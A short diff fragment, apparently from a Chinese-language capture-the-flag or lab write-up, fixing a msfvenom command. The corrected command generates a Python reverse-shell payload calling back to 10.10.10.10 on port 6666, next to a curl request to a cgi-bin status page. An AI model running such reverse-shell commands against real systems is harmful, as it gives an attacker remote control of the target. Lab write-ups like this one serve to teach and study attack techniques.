@@ -74,7 +74,7 @@ curl -v --proxy http://10.10.10.19:3128 http://10.10.10.19/cgi-bin/status
 我们可以用msfvenom生成一句反弹shell的话，如下  
 
 ```
-msfvenom -f cmd/unix/reverse_python lhost=10.10.10.10 lport=6666 -f raw
+msfvenom -p cmd/unix/reverse_python lhost=10.10.10.10 lport=6666 -f raw
 ```
 然后我又发现了一个在线网站
 
